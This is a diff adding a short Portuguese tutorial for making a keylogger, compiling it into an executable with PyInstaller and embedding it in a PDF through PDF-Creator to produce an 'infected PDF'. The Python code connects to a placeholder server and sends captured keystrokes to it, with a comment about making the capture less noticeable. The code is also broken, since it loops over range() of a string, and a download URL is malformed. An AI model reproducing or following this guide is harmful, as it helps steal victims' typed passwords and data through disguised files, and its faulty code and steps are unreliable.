@@ -1,0 +1,50 @@
+
+  1-  Crie um arquivo Python (por exemplo, keylogger.py) contendo o código do keylogger:
+
+import socket
+import sys
+import time
+import os
+
+# Configuração do servidor. Substitua com seu servidor.
+server_address = ('your_server_address', 1234)
+server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+server.connect(server_address)
+
+while True:
+    keys = ""
+
+    for i in range(sys.stdin.read()):
+        key = chr(i)
+        if key == '\n':
+            # Envia as teclas coletadas para o servidor
+            server.send(keys.encode())
+            keys = ""
+        else:
+            keys += key
+
+    time.sleep(0.01)  # tempo de atraso para tornar a gravação de teclas menos perceptível
+
+# Fecha a conexão com o servidor
+server.close()
+
+
+
+2- Compilar o arquivo Python em um arquivo executável usando o PyInstaller:
+
+pip install pyinstaller
+pyinstaller --onefile keylogger.py
+
+
+Isso gerará um novo arquivo executável (por exemplo, keylogger.exe).
+
+
+3-  Baixe e instale o PDF-Creator (por exemplo, versão 2.0.4) de https://www(pdfforge.org/download.
+
+    Usar o PDF-Creator para criar um novo PDF e incorporar o arquivo executável:
+
+    Abra o PDF-Creator.
+    Clique em "Novo arquivo" e, em seguida, em "Fonte de arquivo".
+    Selecione o arquivo executável que você compilou anteriormente (keylogger.exe).
+    Clique em "OK" para salvar o arquivo PDF infectado.
+
